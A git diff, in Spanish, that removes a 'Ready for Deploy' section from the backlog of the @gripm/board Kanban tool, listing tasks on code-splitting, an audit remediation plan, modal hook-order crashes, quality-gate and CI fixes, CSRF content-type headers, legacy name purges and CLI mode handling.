@@ -115,492 +115,6 @@ Permitir a los usuarios vincular tareas o hitos de entrega con sus calendarios p
 
 ---
 
-### 🚀 Ready for Deploy (14)
-
-#### [DEV-164] Code-Splitting del Bundle de Producción con React.lazy y manualChunks en Rollup
-- **Prioridad**: `medium` | **Tipo**: `refactor`
-
-El bundle de producción actual de la aplicación se compila en un único chunk monolítico de 647.44 kB (`dist/assets/index-CBy5mJyL.js`), provocando la advertencia de Vite / Rollup:
-`(!) Some chunks are larger than 500 kB after minification.`
-
-### Diagnóstico de Causa Raíz
-
-1. **Cero `React.lazy` / import dinámico en la UI:** Componentes de gran porte como `SettingsView` (1.993 líneas) y `ReleaseAssembler` (1.202 líneas) se importan sincrónicamente en el arranque de `src/App.tsx`, a pesar de que el usuario no los necesita durante la carga inicial del tablero.
-2. **Ausencia de `manualChunks`:** No hay partición de dependencias de terceros (`vendor`) en `vite.config.ts`, por lo que `react`, `react-dom` y librerías auxiliares se fusionan en el mismo chunk de la aplicación, invalidando el cacheo eficiente de navegadores entre releases.
-
-### Objetivo
-
-Implementar carga perezosa (`React.lazy` con `Suspense`) para vistas no críticas, reduciendo el trabajo de transformación que el servidor de desarrollo realiza en el arranque en frío.
-
-> [!CAUTION]
-> **Corrección de premisa (2026-10-05):** la mitad de esta tarea optimiza un artefacto que el producto **no sirve**. Verificado:
->
-> ```
-> bin/gripm.js:219   createServer({ root: PKG_ROOT, configFile: 'vite.config.ts' })
-> index.html:56      <script type="module" src="/src/main.tsx">   ← NO /assets/
-> ```
->
-> El CLI arranca un **dev server de Vite contra `src/`**, no un servidor de estáticos sobre `dist/`. En consecuencia:
->
-> - `dist/` viaja en el tarball pero **nadie lo carga** (752 KB de peso muerto en el paquete).
-> - `manualChunks` modifica el output de `npm run build`, que **no es lo que el usuario recibe**. Configurarlo no cambia la experiencia de nadie.
-> - La advertencia de Vite sobre chunks >500 kB aparece en el output de `build`, no en el arranque real del producto.
->
-> **Lo que sí es válido:** `React.lazy` reduce los módulos que el dev server debe transformar bajo demanda en el arranque en frío. Ese es un efecto real y medible.
->
-> **Lo que queda por decidir fuera de esta tarea:** si el producto debe servir estáticos (`vite preview`) en vez de dev server. Es una decisión de arquitectura con trade-offs reales (HMR y source maps gratis contra cold start más lento y tarball más chico) y **no** corresponde tomarla dentro de un refactor de code-splitting.
-
-### Objetivo (corregido)
-
-Reducir el trabajo de transformación en el arranque en frío de la interfaz mediante carga diferida de vistas no críticas.
-
-**Criterios de Aceptación:**
-- [x] #1 Implementar carga diferida (`React.lazy` y `<Suspense fallback={...}>`) en `src/App.tsx` para `SettingsView` y `ReleaseAssembler`
-- [x] #2 Verificar que el arranque en frío transforma menos módulos que antes: el conteo de módulos bajo demanda servidos en la carga inicial disminuye respecto de la línea de base medida al inicio de la tarea
-- [x] #3 Medir y registrar la línea de base y el resultado del AC #2 en las notas de la tarea, con los comandos usados — sin ese registro el AC no es verificable
-- [ ] #4 ~~Configurar `manualChunks`~~ **retirado**: no afecta el artefacto que el producto sirve (ver la corrección de premisa)
-- [ ] #5 ~~El chunk principal se reduce por debajo de 450 kB~~ **retirado**: mide `dist/`, que no se sirve
-- [x] #6 La suite de pruebas `npm test` y el check de publicación `npm run publish:check` pasan con exit code 0
-
----
-
-#### [DEV-233] Auditoria integral 2026-10-10 y plan de remediacion por fases
-- **Prioridad**: `high` | **Tipo**: `initiative`
-
-Auditoria exhaustiva de `@gripm/board@1.1.0` (`f9dadc3`) sobre cuatro ejes: codigo de
-`src/`, capa de tooling en `scripts/`, capa de reglas y documentacion, y artefactos de
-proceso (backlog, releases, sprints, retrospectivas). Ademas: historia completa de git y
-reconstruccion de la cadena de incidentes de CI.
-
-**El informe completo vive fuera del backlog, en `docs/auditoria-2026-10-10.md`.**
-Esta tarea solo lo referencia y le da seguimiento. El texto no se duplica aqui a
-proposito: el informe tiene ~1.100 lineas y 90 hallazgos con ID estable, y copiarlo al
-backlog lo convertiria en otro documento que nadie puede mantener sincronizado.
-
-### Como se referencian los hallazgos
-
-El informe asigna un ID estable a cada hallazgo, con prefijo por dominio:
-
-| Prefijo | Significado | Hallazgos |
-|---|---|---|
-| `SEC-xx` | Seguridad | 10 |
-| `BUG-xx` | Defecto funcional | 19 |
-| `GATE-xx` | El gate de calidad no cumple su contrato | 17 |
-| `TOOL-xx` | Defecto de tooling / scripts | 12 |
-| `PROC-xx` | Proceso, datos o trazabilidad | 16 |
-| `DOC-xx` | Documentacion y reglas | 20 |
-| `ARCH-xx` | Deuda tecnica estructural | 9 |
-| `OK-xx` | Acierto a preservar, normativo | 17 |
-
-**Total: 103 hallazgos verificados + 17 aciertos documentados como normativa.**
-
-Conteo obtenido del documento, no estimado: cada ID con definicion aparece como seccion
-`### XXX-nn` (83 de 104) o como fila de tabla en §8.5 y §10 (los `DOC-xx` y `OK-xx`).
-El ID `PROC-17` aparece unicamente dentro de la fe de erratas de §0.4,
-como referencia al numbering anterior.
-
-Los IDs sobreviven al documento: permiten que tareas hijas, commits y revisiones se
-refieran a algo concreto. `SEC-01`, `BUG-01` y `GATE-03` significan lo mismo dentro de seis
-meses.
-
-### El hallazgo que resume todos los demas
-
-**El gate de calidad estuvo verde todo el tiempo porque midio presencia de codigo, no
-comportamiento.**
-
-`npm test` corre 16 pasos en 31.8 s y pasa. Mientras tanto, cinco modales lanzan
-`Rendered more hooks than during the previous render` y matan la aplicacion al abrirse.
-`scripts/verify-focus-trap.js` tiene el chequeo de orden de hooks correcto y lo aplico
-**unicamente al unico archivo que ya complyia**.
-
-### La razon de esta tarea
-
-La auditoria anterior (`docs/informe-auditoria.md`, cerrada en DEV-181) ejecuto sus
-recomendaciones pero no dejo nada verificable: no habia forma de saber meses despues si un
-hallazgo seguía abierto. Esta tarea existe para no repetir eso. Cada fase de la seccion 11
-del informe tiene una columna "Verificacion de cierre" con un comando ejecutable.
-
-### Regla de cierre heredada del informe
-
-> Un hallazgo pasa a cerrado cuando su comando de verificacion deja de detectar el
-> problema **y** un comando de regresion lo impediria volver a aparecer.
->
-> Tildar un AC sin esa asercion es exactamente el fallo que esta auditoria documenta.
-
-**Criterios de Aceptación:**
-- [x] #1 El informe `docs/auditoria-2026-10-10.md` esta commiteado y cada hallazgo tiene ID estable, referencia `archivo:linea` o comando de reproduccion
-- [x] #2 Las 5 fases de la seccion 11 del informe tienen cada una su criterio de verificacion de cierre escrito como comando ejecutable, no como descripcion
-- [x] #3 Los 17 hallazgos `OK-xx` estan marcados como normativa: ningun refactor posterior puede eliminarlos sin una tarea que lo justifique
-- [x] #4 La seccion 11.3 (lo que queda deliberadamente sin resolver: PROC-01, TOOL-08, SEC-06, PROC-10/12/13/14/15) tiene una decision del PO registrada, no un silencio
-- [x] #5 Cada fase que se abra genera tareas hijas con `dependencies: [DEV-233]` y un ID propio, para que el cierre sea rastreable por tarea y no por opinion
-- [x] #6 Ningun hallazgo se marca cerrado sin que su comando de verificacion deje de detectar el problema Y exista un comando de regresion que lo impida reaparecer
-- [x] #7 El informe anterior `docs/informe-auditoria.md` queda referenciado desde DEV-181 con la nota de que fue cerrado sin verificacion, como antecedente del porque de esta tarea
-- [x] #8 Fase 0 (DEV-234) completada y certificada: Primitivo Modal accesible y Estabilidad Funcional P0 (BUG-01, BUG-03, ARCH-06)
-- [x] #9 Fase 1 (DEV-235) completada y certificada: Integridad del Quality Gate y Verificacion Multiplataforma (GATE-01 a GATE-17)
-- [x] #10 Fase 2 (DEV-242, DEV-244, DEV-246) completada y certificada: Remediacion Integral de Seguridad (SEC-01 a SEC-10)
-- [x] #11 Fase 3: Proceso y documentacion (DOC-01 a DOC-22, saneamiento tooling y falsos positivos §8.5, purga DEV-238)
-- [x] #12 Fase 4: Deuda estructural desacoplada formalmente a DEV-165 (modularizacion de vite.config.ts ARCH-01) y backlog
-
----
-
-#### [DEV-234] Fase 0: Primitivo Modal accesible y Estabilidad Funcional P0
-- **Prioridad**: `high` | **Tipo**: `bug`
-
-Implementación de la Fase 0 del plan de remediación de la auditoría integral (DEV-233):
-Resolución de defectos funcionales P0, crashes en tiempo de ejecución al abrir modales y consolidación del componente primitivo accesible `<Modal>`.
-
-### Problemas abordados
-
-1. **BUG-01 / ARCH-06:** En cinco modales (`ProjectModal`, `ImportWizardModal`, `SprintModal`, `FolderPickerModal`, `CompleteSprintModal`), `useFocusTrap` se invocaba después de `if (!isOpen) return null`. Al cambiar `isOpen` a `true`, React lanzaba *"Rendered more hooks than during the previous render"* crasheando la app. Además, el andamiaje de diálogo estaba duplicado a mano en 8 archivos sin un primitivo común y 10 de 13 overlays carecían de portal sobre `document.body` (BUG-16).
-2. **BUG-03:** En `ConfirmModal.tsx`, un listener global de `window` a la tecla `Enter` ejecutaba el borrado incluso cuando el foco del usuario estaba posicionado sobre el botón "Cancelar". Además, `onConfirm()` carecía de `catch`, ocultando excepciones y cerrando el modal erróneamente en caso de fallo.
-3. **BUG-15 / BUG-18 / BUG-19:** Notificaciones `Toast.tsx` invisibles para lectores de pantalla (sin `role="status"` ni `aria-live`), botones de solo icono sin `aria-label` descriptivo, y elementos `<label>` sin vinculación `htmlFor`/`id`.
-4. **BUG-17:** Elementos fijos móviles (barra inferior, header, toasts) sin soporte de `env(safe-area-inset-*)`, provocando solapamiento en dispositivos con home bar o notch.
-5. **GATE-09:** `scripts/verify-focus-trap.js` solo validaba el orden de hooks en `ItemModal`, dejando ciegos a los demás diálogos.
-
-**Criterios de Aceptación:**
-- [x] #1 Extraer primitivo `Modal.tsx` con soporte de portal en `document.body`, `role="dialog"`, `aria-modal="true"`, trampa de foco y backdrop click (ARCH-06, BUG-16)
-- [x] #2 Corregir el orden de hooks en los modales (`ProjectModal`, `PlanGuardModal`, `ImportWizardModal`, `SprintModal`, `FolderPickerModal`, `CompleteSprintModal`), invocando `useFocusTrap` antes de cualquier early return condicional (BUG-01)
-- [x] #3 Blindar `ConfirmModal.tsx` removiendo listener global de Enter ciego al foco y manejando rechazos de `onConfirm` con `try/catch` sin cerrar el modal en error (BUG-03)
-- [x] #4 Incorporar accesibilidad en `Toast.tsx` (`role="status"`, `aria-live="polite"`, `aria-label` en botón de descarte) y nombres accesibles en botones icon-only (BUG-15, BUG-18)
-- [x] #5 Asociar etiquetas `<label htmlFor>` con `<input id>` en `PlanGuardModal`, `ItemModal` y selectores (BUG-19)
-- [x] #6 Aplicar variables de `env(safe-area)` en navegación inferior móvil, encabezado superior y toasts (`grep -c 'env(safe-area' src/` >= 3) (BUG-17)
-- [x] #7 Actualizar `scripts/verify-focus-trap.js` para certificar mecánicamente que `hookIndex < closedGuardIndex` en todos los 8 diálogos de la aplicación (GATE-09)
-- [x] #8 Pirámide de verificación pasa en verde: `npx tsc --noEmit`, `npm test`, `npm run backlog:check`, `npm run audit:ux`, `npm run build` y `npm run publish:check`
-
----
-
-#### [DEV-235] Fase 1: Integridad del Quality Gate y Verificación Multiplataforma
-- **Prioridad**: `high` | **Tipo**: `chore`
-
-Implementación de la Fase 1 del plan de remediación de la auditoría técnica integral (DEV-233):
-Restaurar la integridad, reproducibilidad y carácter multiplataforma del Quality Gate en CI y local.
-
-### Problemas abordados
-
-1. **GATE-03 / GATE-04:** En Windows, las observaciones del baseline de UX fallaban la coincidencia debido al uso de backslashes (`\`) en `path.relative()`, provocando que el verificador omitiera silenciosamente las aserciones de delta con un aviso. Se incorpora `toPosixPath()` en `audit-ux-code.cjs` y se remueve el bypass en `verify-audit-ux-baseline.js`.
-2. **GATE-05:** Erradicación de tres bloques `catch {}` mudos en `verify-backlog-sync.js` (reglas de documentación, integridad de `releases.json` e integridad de `sprints.json`), asegurando que cualquier fallo o corrupción de datos reporte error y bloquee el commit.
-3. **GATE-06 / GATE-17:** En `mcp-server.ts`, registro explícito de fallos en mutaciones en lote (`bulk_update`) en lugar de responder falsos `ok: true`, y unificación del estado objetivo de completitud a `status: ready` canónico en lugar de `Done` en mayúscula.
-4. **GATE-10:** Inclusión del flag `--ignore-scripts` al invocar `npm pack` en `verify-publish-surface.js`, impidiendo la mutación de `core.hooksPath` en `.git/config` durante la auditoría de empaquetado.
-5. **GATE-11:** Envolvimiento de creación de fixtures temporales en bloques `try / finally` y suscripción a eventos de salida del proceso (`process.on('exit')`, `SIGINT`) en `verify-mcp-binary.js` y `verify-resilience-and-cli.js`.
-6. **GATE-14 / GATE-15:** Validación estricta y numérica de argumentos `--timeout` y variable `GRIPM_WATCHDOG_MS` para impedir ejecuciones instantáneas con `NaN` o `0ms`, y soporte de control de corte con `--bail` / `--no-bail`.
-7. **GATE-01 / GATE-16:** Integración de `verify-changes.js --all` en CI (`.github/workflows/ci.yml`) y extensión del presupuesto de tiempo de ejecución de jobs de 25m a 35m.
-
-**Criterios de Aceptación:**
-- [x] #1 Normalizar rutas con `toPosixPath` en `audit-ux-code.cjs` y remover el bypass de Windows en `verify-audit-ux-baseline.js` (GATE-03, GATE-04)
-- [x] #2 Reemplazar catches silenciosos por logging y conteo de errores en `verify-backlog-sync.js` (GATE-05)
-- [x] #3 Manejar fallos de escritura en `bulk_update` y unificar transición automática a `status: ready` en `mcp-server.ts` (GATE-06, GATE-17)
-- [x] #4 Preservar el contrato de solo lectura en `verify-publish-surface.js` pasando `--ignore-scripts` a `npm pack` (GATE-10)
-- [x] #5 Garantizar limpieza de archivos de prueba temporales (`DEV-998`, `DEV-999`) con `try/finally` y hooks de proceso (GATE-11)
-- [x] #6 Validar argumentos `--timeout` numéricos y fallback seguro de `GRIPM_WATCHDOG_MS` (GATE-14, GATE-15)
-- [x] #7 Integrar `verify-changes.js --all` y ampliar timeout a 35m en `.github/workflows/ci.yml` (GATE-01, GATE-16)
-- [x] #8 Pirámide de verificación en verde: `npx tsc --noEmit`, `npm test`, `npm run backlog:check`, `npm run audit:ux`, `npm run build` y `npm run publish:check`
-
----
-
-#### [DEV-236] Selector de Proyectos Queda por Detrás de la Barra de Filtros por Conflicto de Stacking Context
-- **Prioridad**: `high` | **Tipo**: `bug`
-
-Al abrir el selector desplegable de proyectos en el encabezado (`Header.tsx`), la parte superior del menú quedaba visualmente oculta **por detrás de la barra de búsqueda y filtros** (`FilterBar.tsx`), mostrando únicamente la sección inferior sobre las columnas de Kanban.
-
-### Causa Raíz
-
-Conflicto de niveles de apilamiento (*stacking context tie*):
-- Tanto `<header>` (`Header.tsx:122`) como el contenedor de `<FilterBar>` (`FilterBar.tsx:162`) declaraban la misma clase de z-index: `z-30`.
-- Ambos elementos establecen contextos de apilamiento posicionados (`sticky` y `relative`).
-- En el árbol DOM (`App.tsx`), `FilterBar` se renderiza inmediatamente después de `Header`.
-- Según la especificación CSS 2.1 (Apéndice E), cuando dos contextos de apilamiento hermanos tienen el mismo valor de `z-index`, el orden en el documento determina la prioridad de pintado. `FilterBar` se pintaba encima de `Header` y de todos sus descendientes (incluyendo el menú desplegable del selector con `z-50`).
-
-### Solución
-
-Ajustar la jerarquía canónica de z-index del sistema:
-- `FilterBar.tsx`: Reducir de `z-30` a `z-10`. De este modo, `FilterBar` conserva prioridad sobre el contenido del tablero (tarjetas y columnas en `z-auto`), pero queda estrictamente por debajo de `Header` (`z-30`).
-- El menú del selector de proyectos (`z-50` dentro de `Header`) se proyecta limpiamente por encima de la barra de filtros.
-- Al hacer scroll, `FilterBar` se desliza correctamente por debajo del encabezado adhesivo (`Header`).
-- Incorporar prueba anti-regresión en `scripts/test-ui-logic.js` para certificar la jerarquía `headerZ > filterBarZ`.
-
-**Criterios de Aceptación:**
-- [x] #1 FilterBar define z-index inferior al de Header (z-10 vs z-30) para evitar colisión de contextos de apilamiento
-- [x] #2 El menú desplegable del selector de proyectos se renderiza completamente por encima de FilterBar sin oclusión visual
-- [x] #3 FilterBar y su popover de filtros avanzados mantienen prioridad sobre las columnas y tarjetas del tablero
-- [x] #4 Prueba estática anti-regresión en test-ui-logic.js que valida invariante headerZ > filterBarZ
-- [x] #5 Pirámide de verificación en verde (tsc --noEmit, npm test, backlog:sync, backlog:check)
-
----
-
-#### [DEV-237] Resolución integral de Restaurar Proyecto Demo (Error 415 por Content-Type y activación multi-proyecto)
-- **Prioridad**: `high` | **Tipo**: `bug`
-
-Al invocar la acción "Restaurar Proyecto Demo" desde el selector de proyectos, se manifestaban dos fallas consecutivas:
-1. **Error HTTP 415 (Unsupported Media Type):** Al enviar la petición `POST /api/projects/restore-demo`, el middleware de seguridad CSRF de `vite.config.ts` rechazaba la solicitud por no incluir `Content-Type: application/json`.
-2. **Invisibilidad y falta de activación del Demo:** Tras resolver el 415, el servidor respondía OK y mostraba el toast de éxito, pero la pantalla no mostraba ningún cambio ni proyecto demo. Esto ocurría por dos factores combinados:
-   - En `vite.config.ts`, `isSingleMode` forzaba `true` de manera incondicional ante la ausencia de `process.env.GRIPM_MODE='multi'` (ignorando `config.mode: "multi"` de `.gripm/config.json` y la existencia de múltiples proyectos en el registro). Como resultado, `GET /api/data` filtraba y descartaba todos los proyectos del registro excepto el proyecto activo inicial (`gripm`), impidiendo que el cliente recibiera el proyecto demo y sus ítems.
-   - En `src/App.tsx`, `handleRestoreDemo` no conmutaba `selectedProjectId` a `'demo'`, dejando la interfaz anclada en el proyecto anterior.
-
-### Solución
-
-1. **Headers de mutación en `src/api.ts`:** Se agregaron `headers: { 'Content-Type': 'application/json' }` y `body: JSON.stringify({})` en `restoreDemoProject()`, `convertProjectToMd()` y `convertProjectToJson()`.
-2. **Detección consistente de `isSingleMode` en `vite.config.ts`:**
-   - Respeta `config.mode` (`"multi"` / `"single"`) definido en `.gripm/config.json`.
-   - Si no hay modo forzado por entorno ni configuración, deriva `isSingleMode` dinámicamente según `registry.projects.length <= 1`, permitiendo que coexistan múltiples proyectos sin forzar monoproyecto artificial.
-3. **Activación de proyecto demo:**
-   - En `vite.config.ts`, `POST /api/projects/restore-demo` establece `registry.activeProjectId = 'demo'`.
-   - En `src/App.tsx`, `handleRestoreDemo` ejecuta `setSelectedProjectId('demo')`, sincroniza con `STORAGE_KEYS.ACTIVE_PROJECT_ID` y llama a `setActiveProjectApi('demo')`.
-4. **Pruebas anti-regresión:** En `scripts/test-api-security.js`, se valida estáticamente que todas las peticiones `POST`/`PUT` de `src/api.ts` contengan `Content-Type: application/json`.
-
-**Criterios de Aceptación:**
-- [x] #1 restoreDemoProject, convertProjectToMd y convertProjectToJson envían Content-Type application/json
-- [x] #2 /api/projects/restore-demo responde 200 OK y registra demo como activeProjectId sin error 415
-- [x] #3 vite.config.ts respeta config.mode y registry.projects.length en isSingleMode sin ocultar proyectos registrados
-- [x] #4 handleRestoreDemo en App.tsx conmuta selectedProjectId a demo y renderiza inmediatamente el tablero demo
-- [x] #5 Prueba estática en test-api-security.js valida que todo fetch POST/PUT en src/api.ts incluye Content-Type application/json
-- [x] #6 Pirámide de verificación en verde (tsc --noEmit, npm test, backlog:sync, backlog:check)
-
----
-
-#### [DEV-238] Erradicación total de referencias legacy DevBoard (devboard, dev-board, .devboard, DEVBOARD_*) en código activo
-- **Prioridad**: `high` | **Tipo**: `chore`
-
-Invariante canónico del proyecto: **"Cualquier referencia en código activo a `dev-board`, `devboard`, `.devboard` o `DEVBOARD_*` es un defecto si no es `gripm`"**.
-
-Tras la consolidación como paquete autónomo `@gripm/board`, no existe justificación para sostener capas de compatibilidad con versiones pre-1.0. Esta tarea define la purga atómica e integral de todas las variantes del nombre histórico en el código fuente.
-
-### Inventario de las 5 Capas de Purga
-
-1. **Variables de entorno de proceso:**
-   - Erradicar todos los operadores fallback `|| process.env.DEVBOARD_*` en `vite.config.ts`, `bin/gripm.js`, `scripts/registryConfig.js` y `scripts/updateChecker.js`.
-   - Variables a purgar: `DEVBOARD_MODE`, `DEVBOARD_HOST`, `DEVBOARD_PORT`, `DEVBOARD_OPEN`, `DEVBOARD_ALLOWED_PATHS`, `DEVBOARD_ALLOWED_HOSTS`, `DEVBOARD_HOME`, `DEVBOARD_REGISTRY_PATH`, `DEVBOARD_TARGET_REPO`, `DEVBOARD_NO_UPDATE_CHECK`.
-   - Único contrato válido: `GRIPM_*`.
-
-2. **Directorios y rutas en disco:**
-   - Purgar búsquedas de carpetas `.devboard/` y archivos `.devboard/config.json` o `.devboard/backlog.json` en `vite.config.ts` y scripts.
-   - Purgar referencias a `data/dev-board.json` y `data/projects-registry.json` (incluyendo `.gitignore` y scripts de empaquetado).
-   - Único contrato válido: `.gripm/`.
-
-3. **Claves de almacenamiento en navegador (`src/utils/storage.ts`):**
-   - Retirar los 9 arrays de claves alias legacy (`devboard-theme`, `devboard_active_tab`, `devboard_active_project_id`, `devboard_kanban_sprint`, etc.).
-   - Único contrato válido: `gripm_*` / `gripm-*`.
-
-4. **Nombres internos, plugins y contratos de TypeScript:**
-   - En `vite.config.ts`: renombrar `devBoardApi()` a `gripmApi()`, `DevBoardPlugin` a `GripmPlugin`, y el nombre del plugin `'vite-plugin-dev-board-api'` a `'vite-plugin-gripm-api'`.
-   - En `src/types.ts`: eliminar alias de tipo `export type DevBoardConfig = GripmConfig`.
-   - En `src/api.ts`: renombrar propiedad `hasDevBoard` a `hasGripm`.
-   - En `scripts/registryConfig.js`: renombrar `getDevBoardHomeDir()` a `getGripmHomeDir()`.
-
-5. **Logs de consola y textos de usuario:**
-   - Reemplazar prefijos de log `[DevBoard API]`, `[DevBoard Watcher]`, `[DevBoard FS]`, `[DevBoard Backlog.md]` por `[gripm ...]`.
-   - Corregir descripción del proyecto demo en `vite.config.ts` ("Proyecto de demostración de gripm").
-
-6. **Actualización de suites de test:**
-   - Actualizar `scripts/test-api-security.js`, `scripts/verify-integration.js`, `scripts/verify-optimistic-locking.js`, `scripts/verify-sse.js` y `scripts/verify-legacy-import.js` para buscar e interactuar exclusivamente con `'vite-plugin-gripm-api'` y variables `GRIPM_*`.
-
-**Criterios de Aceptación:**
-- [x] #1 Cero ocurrencias de variables process.env.DEVBOARD_* en código fuente activo
-- [x] #2 Cero referencias a carpetas .devboard/ o archivos dev-board.json en el runtime y scripts
-- [x] #3 src/utils/storage.ts purgado de arrays de claves de retrocompatibilidad devboard_*
-- [x] #4 vite.config.ts y types.ts renombran plugins y contratos internos a gripmApi / vite-plugin-gripm-api
-- [x] #5 Logs de consola y descripciones en runtime estandarizados 100% en gripm
-- [x] #6 Suites de prueba actualizadas al nuevo estándar sin romper ningún paso de la suite
-- [x] #7 Pirámide de verificación en verde (tsc --noEmit, npm test con 16 pasos, backlog:sync, backlog:check)
-
----
-
-#### [DEV-239] Unificación de switches on/off en Settings y erradicación de checkboxes nativos simples
-- **Prioridad**: `high` | **Tipo**: `feature`
-
-Al evolucionar la configuración de **Modules & Add-ons** (DEV-220) hacia switches interactivos on/off, se produjo una inconsistencia de UX en el resto de los paneles de configuración de `SettingsView.tsx`. Los controles booleanos en **Workflows & Views**, **Tablero Kanban** y **Apariencia** permanecieron implementados con `<input type="checkbox">` nativos del navegador, creando una experiencia fragmentada, poco ergonómica y visualmente heterogénea.
-
-### Objetivos y Solución
-
-1. **Componente Reutilizable y Accesible `SettingsSwitch`:**
-   - Crear un componente `SettingsSwitch` en `src/components/SettingsView.tsx` estilizado con el design system canónico de Gripm.
-   - Pista con esquinas redondeadas (`w-11 h-6`), botón deslizante con sombra sutil (`h-5 w-5 shadow-xs`) y transición suave (`transition-all duration-200`).
-   - Micro-interacción táctil (`active:scale-95`).
-   - Accesibilidad con foco visible de alto contraste (`peer-focus-visible:ring-2 peer-focus-visible:ring-indigo-500 peer-focus-visible:ring-offset-2`) y soporte `aria-label`.
-   - Contenedor `span` para evitar anidamiento prohibido de `<label>` en tarjetas que ya son clickeables.
-
-2. **Reemplazo Integral en Todas las Pestañas Afectadas:**
-   - **Workflows & Views (`views`):** Reemplazar los 3 checkboxes nativos de pestañas visibles (`enabledTabs.kanban`, `enabledTabs.sprint`, `enabledTabs.release`).
-   - **Tablero Kanban (`kanban`):** Reemplazar los 2 checkboxes nativos de configuración (`showIdeasByDefault`, `showDoneHistoryByDefault`).
-   - **Apariencia (`visual`):** Reemplazar los 2 checkboxes nativos de preferencias (`autoSave`, `rankingEnabled`).
-   - **Modules & Add-ons (`modules`):** Unificar los 3 switches existentes (`sprint`, `release`, `modeState === 'multi'`) usando también `SettingsSwitch` para eliminar código duplicado.
-
-3. **Pruebas y Verificación:**
-   - Validar estáticamente y unitariamente en tests que no queden checkboxes nativos simples en `SettingsView.tsx`.
-   - Validar la accesibilidad y ergonomía con `npm run audit:ux` y la suite de pruebas completa `npm test`.
-
-**Criterios de Aceptación:**
-- [x] #1 Crear componente SettingsSwitch reutilizable, accesible (teclado + aria-label) y consistente en SettingsView.tsx
-- [x] #2 Reemplazar checkboxes simples en Workflows & Views (kanban, sprint, release) por SettingsSwitch
-- [x] #3 Reemplazar checkboxes simples en Tablero Kanban (showIdeasByDefault, showDoneHistoryByDefault) por SettingsSwitch
-- [x] #4 Reemplazar checkboxes simples en Apariencia (autoSave, rankingEnabled) por SettingsSwitch
-- [x] #5 Unificar los switches de Modules & Add-ons bajo el componente SettingsSwitch sin duplicación de markup
-- [x] #6 Zero errores de tipos (npx tsc --noEmit) y cero checkboxes nativos residuales en SettingsView.tsx
-- [x] #7 Suite de pruebas completa (npm test) y auditoría UX (npm run audit:ux) en verde sin regresiones
-
----
-
-#### [DEV-240] Intercambiabilidad de modos --single y --hub en runtime y persistencia activa del proyecto demo
-- **Prioridad**: `high` | **Tipo**: `bug`
-
-Tras ejecutar la inicialización de un repositorio mediante `gripm --init`, las opciones de runtime `--single` y `--hub` (o `--multi`) no funcionaban de forma intercambiable y la experiencia con el proyecto Demo presentaba fallas de activación y persistencia:
-1. **Conflicto de Precedencia CLI vs. Configuración Local:** Al iniciar el servidor web, `src/App.tsx` subordinaba la bandera `singleProject` a la configuración estática `.gripm/config.json` (`config.mode === 'single'`), ignorando la bandera CLI `--hub` recibida por el servidor y ocultando el selector de proyectos.
-2. **Sobreescritura Incondicional de `activeProjectId`:** En `vite.config.ts`, la función `getRegistry()` sobreescribía `reg.activeProjectId = existingLocal.id` en cada petición HTTP si detectaba el repositorio local actual, revirtiendo inmediatamente cualquier selección del usuario hacia el proyecto demo u otro proyecto del Hub.
-3. **Resolución Rígida de `activeProject`:** En `vite.config.ts`, la resolución del proyecto activo priorizaba la ruta del sistema de archivos sobre `registry.activeProjectId`, impidiendo que el backend despachara las tareas y metadatos del proyecto demo en modo Hub.
-4. **Flags de CLI en `bin/gripm.js`:** La ejecución sin banderas (`gripm`) forzaba incondicionalmente `process.env.GRIPM_MODE = 'single'`, impidiendo que proyectos configurados con modo hub en `.gripm/config.json` funcionaran adecuadamente al invocar el binario directamente.
-
-### Solución
-
-1. **Precedencia canónica en CLI (`bin/gripm.js`):**
-   - `--hub` / `--multi` establece `GRIPM_MODE = 'multi'`.
-   - `--single` establece `GRIPM_MODE = 'single'`.
-   - Ejecución sin banderas elimina `GRIPM_MODE` para permitir que el servidor derive el modo desde `.gripm/config.json` o la cantidad de proyectos en el registro.
-2. **Preservación de identidad activa en `vite.config.ts`:**
-   - En `getRegistry()`, solo se asigna `reg.activeProjectId = existingLocal.id` si `reg.activeProjectId` no estaba previamente definido.
-   - En la resolución de `activeProject`, en modo Hub (`!isSingleMode`) se prioriza `registry.activeProjectId`, despachando el proyecto demo y sus tareas completas.
-3. **Precedencia de runtime en cliente (`src/App.tsx`):**
-   - El prop `singleProject` de `Header` consume prioritariamente `boardData.singleProject`, respondiendo dinámicamente a la bandera del CLI.
-   - Ante eventos SSE `settings_changed`, se revalida `loadData(true)` para reflejar cambios de modo en caliente.
-4. **Badge diferenciado en Header (`src/components/Header.tsx`):**
-   - Si se ejecuta en modo mono-proyecto sobre el proyecto demo, se muestra la etiqueta "Demo" en lugar de "Local".
-
-**Criterios de Aceptación:**
-- [x] #1 bin/gripm.js respeta flags CLI --single y --hub explícitas y no fuerza single en ejecuciones sin banderas
-- [x] #2 vite.config.ts preserva registry.activeProjectId sin sobreescribirlo con el repo local en cada petición
-- [x] #3 vite.config.ts en modo hub resuelve activeProject desde registry.activeProjectId permitiendo visualizar proyecto demo
-- [x] #4 src/App.tsx prioriza boardData.singleProject sobre config.mode permitiendo alternar --single y --hub en runtime
-- [x] #5 Header.tsx distingue badge 'Demo' vs 'Local' en modo singleProject
-- [x] #6 Pruebas automatizadas validan la precedencia de flags CLI y la activación del proyecto demo
-
----
-
-#### [DEV-241] Consistencia condicional de configuraciones segun modulos y add-ons activos
-- **Prioridad**: `high` | **Tipo**: `bug`
-
-Garantizar coherencia total en la vista de configuración (`SettingsView`):
-1. **Disponibilidad condicional según módulos instalados/activos:** Solo exponer configuraciones correspondientes a módulos habilitados en *Módulos & Add-ons* (o seleccionados en el onboarding de `--init`).
-2. **Metodologías acopladas al módulo Sprints:** Cuando el módulo Sprints está inactivo (`enabledTabs.sprint === false`), las metodologías Scrum y Scrumban se deshabilitan visual y funcionalmente (mostrando badge de advertencia y tooltip/descripción informativa), forzando y preservando la metodología en `kanban`.
-3. **Vistas predeterminadas consistentes:** Las opciones de vista inicial (`sprint`, `release`) quedan deshabilitadas si sus respectivos módulos están inactivos, con fallback automático a `kanban` para evitar pantallas inaccesibles o rotas.
-4. **Pestañas visibles en cabecera:** Reflejar inequívocamente el estado de los módulos de Sprints y Releases en la sección de pestañas superiores, deshabilitando su conmutación individual cuando el módulo raíz está desactivado e informando al usuario sobre su activación en *Módulos & Add-ons*.
-
-**Criterios de Aceptación:**
-- [x] #1 Scrum y Scrumban quedan visual y funcionalmente deshabilitados en Workflow & Views cuando el modulo Sprints esta inactivo
-- [x] #2 La vista predeterminada no permite seleccionar Sprints o Releases si sus modulos correspondientes estan inactivos y hace fallback limpio a kanban
-- [x] #3 La seccion de pestanas visibles en cabecera bloquea conmutadores de modulos inactivos con indicacion explicita
